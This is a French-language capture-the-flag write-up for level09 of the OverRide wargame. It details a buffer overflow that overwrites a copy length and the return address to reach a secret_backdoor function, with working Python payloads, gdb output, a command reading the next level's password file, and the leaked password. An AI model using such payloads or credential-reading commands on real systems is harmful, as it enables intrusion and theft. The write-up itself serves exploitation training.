# Level 09

Le programme attend deux entrées utilisateur, un username et un message.

En examinant le programme décompilé avec guidra, on constate qu'il est possible d'écraser des valeurs en mémoire à cause d'une erreur de sécurité de longeur de chaine. La fonction secret_backdoor semble etre la redirection du programme a effectuer.



set_username copie les 41 premiers caractères du username dans le buffer à partir de l'emplacement 140.

Comme dans set_msg le strncpy copy un maximum de data (buffer) + 0xb4, on comprend qu'il est possible d'écraser la valeur la valeur de cet emplacement mémoire grace au set_username qui écris a partir de 140.

Nous allons entrer, apres un offset de 40, un nombre énorme pour pouvoir écrire la taille que l'on veut dans le strcpy.

```
level09@OverRide:~$ python -c 'print("A" * 40 + "\xff\xff\xff\xff" + "\n") + ""' | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?>: Msg @Unix-Dude
>>: >: Msg sent!
Segmentation fault (core dumped)
level09@OverRide:~$ dmesg
[ 2114.296485] traps: level09[1753] general protection ip:4138674137674136 sp:7fffffffe610 error:0
```

j'utilise un pattern generator pour calculer l'offset afin d'override l'adresse de retour de la fonction set_msg.
l'offset est 200.

Il ne reste plus qu'a trouver l'adresse de secret_backdoor grace a gdb.

```
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

Enfin, secret backdoor utilise l'entrée utilisateur pour executer une commande systeme, nous n'avons qu'a l'inclure au payload.

```
python -c 'print("A" * 40 + "\xff\xff\xff\xff" + "\n" + "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00") + "\n" + "cat /home/users/end/.pass"' | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
level09@OverRide:~$ su end
Password: 
end@OverRide:~$ cat end 
GG !
```